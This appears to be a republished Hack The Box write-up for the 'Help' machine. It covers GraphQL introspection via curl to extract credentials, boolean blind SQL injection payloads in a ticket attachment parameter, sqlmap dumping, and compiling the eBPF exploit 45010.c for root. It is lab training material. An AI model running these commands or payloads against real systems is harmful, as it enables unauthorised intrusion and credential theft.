# :globe_with_meridians: HTB | Help -GraphQL and Blind SQL

> **Original Source:** [HTB | Help -GraphQL and Blind SQL](https://infosecwriteups.com/htb-help-graphql-and-blind-sql-5967ecebf9e1)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# HTB | Help -GraphQL and Blind SQL


This is the Box on [Hack The Box Linux Privilege Escalation 101 Track](https://app.hackthebox.com/tracks/Linux-Privilege-Escalation-101). Find the box [here](https://app.hackthebox.com/machines/170).


### Skill Learned


- GraphQL enumeration

- Blind SQL injection

## NMAP


IP: 10.10.10.121


```
nmap -sT -p- --min-rate 10000 10.10.10.121
```


```
nmap -sC -sV -p 22,80,3000 10.10.10.121
```


*nmap scan*

## Port 80


Let’s visit port 80


*port 80*


```
dirsearch -u http://help.htb/ -x 403,404
```


*dirsearch*


*/support/*


```
searchsploit helpdeskz
```


*searchsploit helpdeskz*


found arbitrary file upload


`searchsploit -m php/webapps/40300.py` to copy the exploit


Exploit requires us to upload a PHP shell file, but it is not allowed


i tried php,php3,php5,phtml but no luck


Let’s look at port 3000

## Port 3000


This port hosts an HTTP API. On visiting the root, there’s a message about credentials with the correct query

*port 3000*

### GraphQL


Looking at the response headers, I see it’s powered by Express:

*port 3000*


Looking around on Google led me to [GraphQL](https://graphql.org/), a query language designed for APIs. When I tried paths that didn’t exist, I got this message:

*/test*


But when I tried /graphql, I got:

*/graphql*


This [article](https://graphql.org/learn/introspection/) is a useful guide to enumerating a GraphQL instance. This [post](https://www.apollographql.com/blog/4-simple-ways-to-call-a-graphql-api#2-curl) was useful to figure out how to interact with GraphQL with curl.


I’ll switch to curl here to hit the API. `-s` will silence the progress bar.` -H "Content-Type: application/json"` is necessary for the API to handle the JSON data. Then I’ll use `-d '{ "query": "[query]" }'` it to send the query. Finally, I’ll use `jq` to pretty print the results.


## Get anuragtaparia’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


First I’ll get the fields from the schema:


```
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { queryType { name, fields { name, description } } } }" }' | jq -c .
```


I’ll also get the types of User, String, etc:


```
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { types { name } } }" }' | jq .
```


I’ll get the fields associated with the User type:


```
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __type(name: "User") { name fields { name } } }" }' | jq .
```


I’ll try to get values


```
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ user { username password } }" }' | jq .
```


from [crackstation](https://crackstation.net/) we got the value.


Now let’s try to login to portal


and we are in portal


## Foothold/shell


I tried submitting the ticket with the attachment test.txt. On submitting, I could see my ticket:


The link to the attachment is: `http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6` If I visit the link I file gets download


The SQLi in the last param. If I add `' AND 1=1-- -'` the file gets downloaded and If I add `' AND 1=2-- -'` I get the below error page


That’s a blind injection. I can pass some tests in, and get true (downloaded attachment) or false (Whoops!) back.

### SQLMAP


save the request to a text file and run sqlmap


```
sqlmap -r req.txt --level 5 --risk 3 -p param[]
```


I’ve got the injection. Now I’ll run with — dump. One table that looks interesting is:


```
sqlmap -r req.txt --level 5 --dump
```


we have found the password


*sql table*


let’s try to ssh via this


and we are in and found user.txt

*user.txt*

## Priv Esc


Let’s copy [linux-exploit-suggester.sh](https://github.com/The-Z-Labs/linux-exploit-suggester) to box.


we got many exploits. Let’s start with [CVE-2017–16995] [eBPF_verifier](https://www.exploit-db.com/exploits/45010)


Let’s copy the exploit to the box and run


```
gcc -o a 45010.c
./a
```


*./a*


found root.txt

*root.txt*


If you enjoyed this article and want to dive deeper into cybersecurity topics, feel free to explore my detailed write-ups on GitBook. I cover a range of topics including vulnerability assessments, penetration testing techniques, and security methodologies.


👉 [Check out my GitBook for more insights](https://anuragtaparia.gitbook.io/write-ups)


👉 Watch my videos on YouTube: [AnuragSec](http://www.youtube.com/@AnuragSec)


Stay tuned for more content, and don’t forget to follow for future updates!

---

*Originally published on [Medium](https://infosecwriteups.com/htb-help-graphql-and-blind-sql-5967ecebf9e1). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
